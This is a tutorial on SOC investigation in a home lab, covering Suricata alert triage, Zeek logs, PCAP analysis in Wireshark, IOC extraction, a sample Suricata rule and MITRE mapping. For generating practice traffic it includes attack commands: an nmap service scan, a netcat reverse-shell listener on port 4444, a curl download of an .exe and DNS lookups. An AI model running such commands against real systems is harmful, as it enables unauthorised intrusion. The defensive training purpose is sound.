Complete SOC Workflow & Investigation Flow (Visual Guide)

A practical SOC analyst workflow using:

Security Onion
Suricata
Zeek
Wireshark
NetworkMiner
🔴 BIG PICTURE — SOC Architecture
                 ┌──────────────────────┐
                 │  Security Onion SOC  │
                 │ SIEM / IDS / PCAP    │
                 └──────────┬───────────┘
                            │
        ┌───────────────────┼───────────────────┐
        │                   │                   │
┌───────▼───────┐   ┌───────▼────────┐  ┌──────▼──────┐
│ Kali Linux    │   │ Metasploitable │  │ Windows 7   │
│ (Attacker)    │   │ (Victim)       │  │ Victim/Test │
└───────────────┘   └────────────────┘  └─────────────┘
🔥 REAL SOC WORKFLOW
Attack Occurs
      ↓
Suricata Detects Alert
      ↓
SOC Analyst Reviews Alert
      ↓
Threat Hunting in Security Onion
      ↓
Review Zeek Logs
      ↓
Retrieve PCAP
      ↓
Analyze in Wireshark
      ↓
Extract IOCs
      ↓
Validate Malicious Activity
      ↓
Write Detection Rules
      ↓
Document Incident
🔴 PHASE 1 — Generate Traffic
🎯 Goal

Create realistic attack traffic.

✅ Example Attacks
Attack	Tool
Port scan	Nmap
Reverse shell	Netcat
Web attack	curl
SMB scan	smbclient
DNS tunneling	nslookup loop
🔥 Example

From Kali Linux:

nmap -sV 192.168.207.136
🔴 PHASE 2 — Detection
🎯 Goal

Automatically generate alerts from malicious activity.

🔥 Suricata Detects

Example alerts:

ET SCAN NMAP
SMB exploit
Reverse shell
Suspicious DNS
Malware beaconing
🔥 Visual Workflow
Attacker Traffic
      ↓
Network Sensor
      ↓
Suricata Inspects Packets
      ↓
Alert Generated
      ↓
Security Onion Displays Alert
🔴 PHASE 3 — Alert Triage
🎯 Goal

Quickly identify:

Attacker
Victim
Severity
Attack type
✅ In Security Onion

Open:

Alerts
🔥 What to Review
Field	Meaning
Source IP	Usually attacker
Destination IP	Usually victim
Signature	Attack detected
Severity	Alert priority
Timestamp	When attack occurred
🔥 Example
ET SCAN NMAP TCP Scan
Source: 192.168.207.133
Destination: 192.168.207.136
🔴 PHASE 4 — Threat Hunting
🎯 Goal

Find all related attacker activity.

✅ Open Hunt

Use queries like:

source.ip: "192.168.207.133"
🔥 Hunt Answers
What else did attacker do?
Which ports were used?
Which protocols?
Was activity repeated?
Was data transferred?
🔴 PHASE 5 — Zeek Investigation
🎯 Goal

Review network metadata.

🔥 Zeek Logs Everything
Log	Purpose
conn.log	Connections
dns.log	DNS activity
http.log	Web requests
ssl.log	TLS sessions
files.log	File transfers
🔥 Visual Flow
Raw Packets
      ↓
Zeek Extracts Metadata
      ↓
Searchable Logs
🔴 PHASE 6 — PCAP Retrieval
🎯 Goal

Capture full malicious packets.

✅ Open PCAP Section

Search by:

Attacker IP
Victim IP
Timeframe
Port
🔥 Example
192.168.207.133 → 192.168.207.136
🔴 PHASE 7 — Wireshark Analysis
🎯 Goal

Perform deep packet investigation.

🔥 Visual Packet Flow
Packet Capture
      ↓
Wireshark
      ↓
Protocol Analysis
      ↓
Payload Inspection
      ↓
IOC Extraction
✅ Common Wireshark Filters
HTTP
http
DNS
dns
Specific IP
ip.addr == 192.168.207.133
Reverse Shell
tcp.port == 4444
HTTP POST Requests
http.request.method == "POST"
🔴 PHASE 8 — Identify Malicious Patterns
🎯 Goal

Recognize attacker behavior visually.

🔥 Beaconing

Looks like:

Small packets
Same interval
Same destination
Repeated connections
🔥 Reverse Shell

Looks like:

Long TCP session
Interactive packets
Keyboard-like traffic
Constant ACK packets
🔥 DNS Tunneling

Looks like:

Many DNS requests
Long/random subdomains
High query frequency
🔥 Data Exfiltration

Looks like:

Large outbound traffic
HTTP POST uploads
Encoded payloads
Large DNS TXT queries
🔴 PHASE 9 — Follow TCP Streams
🎯 Goal

Reconstruct attacker communication.

✅ In Wireshark

Right-click packet:

Follow → TCP Stream
🔥 This Reveals
Commands
Malware traffic
HTTP body
Reverse shell data
File transfers
🔴 PHASE 10 — IOC Extraction
🎯 Goal

Collect indicators of compromise.

✅ IOC Examples
Type	Example
IP	192.168.207.133
Domain	pipiskin.hk
URI	/index1.php
Port	4444
File hash	malware.exe
🔴 PHASE 11 — Detection Engineering
🎯 Goal

Create custom detections.

🔥 Suricata Rule Example
alert http any any -> any any (
msg:"Malware Beacon";
flow:established,to_server;
content:"POST";
http.method;
content:"/index1.php";
http.uri;
sid:1000001;
rev:1;
)
🔴 PHASE 12 — Incident Documentation
🎯 Goal

Write professional SOC reports.

✅ Standard Structure
Alert
↓
Investigation
↓
IOC Extraction
↓
Impact
↓
MITRE Mapping
↓
Recommendations
🔥 MITRE ATT&CK Mapping Example
Technique	Activity
T1046	Network scan
T1059	Command execution
T1071.001	HTTP C2
T1041	Data exfiltration
🔴 COMPLETE INVESTIGATION FLOW
1. Alert fires
        ↓
2. Triage alert
        ↓
3. Hunt related activity
        ↓
4. Review Zeek logs
        ↓
5. Retrieve PCAP
        ↓
6. Analyze in Wireshark
        ↓
7. Extract IOCs
        ↓
8. Validate attack
        ↓
9. Write detection rule
        ↓
10. Document incident
🔥 DAILY PRACTICE LOOP
Generate attack
      ↓
See alert
      ↓
Investigate
      ↓
Capture packets
      ↓
Analyze traffic
      ↓
Extract IOCs
      ↓
Document findings
🔴 BEST BEGINNER ATTACK FLOW TO PRACTICE
1️⃣ Recon
nmap -sV <victim-ip>
2️⃣ Reverse Shell

Listener:

nc -lvnp 4444
3️⃣ HTTP Beacon
curl http://testdomain/file.exe
4️⃣ DNS Activity
nslookup malware.test
🔥 What You Should Observe
Tool	What to Observe
Suricata	Alerts
Zeek	Metadata
PCAP	Full packets
Wireshark	Payloads
Hunt	Correlation
🔴 SOC Analyst Investigation Checklist
✅ Initial Triage
Identify source IP
Identify destination IP
Identify attack type
Determine severity
✅ Threat Hunting
Search attacker IP
Search victim IP
Review related alerts
Check repeated behavior
✅ Packet Analysis
Retrieve PCAP
Follow TCP streams
Identify payloads
Extract domains and URIs
✅ IOC Collection
IP addresses
Domains
URLs
Ports
File hashes
✅ Reporting
Write timeline
Explain attack chain
Map MITRE ATT&CK
Provide recommendations
🔥 Real SOC Skills Practiced

This workflow demonstrates:

Alert triage
Threat hunting
PCAP analysis
IOC extraction
Detection engineering
Incident response
MITRE ATT&CK mapping
SOC documentation
Malware traffic analysis
Network forensics
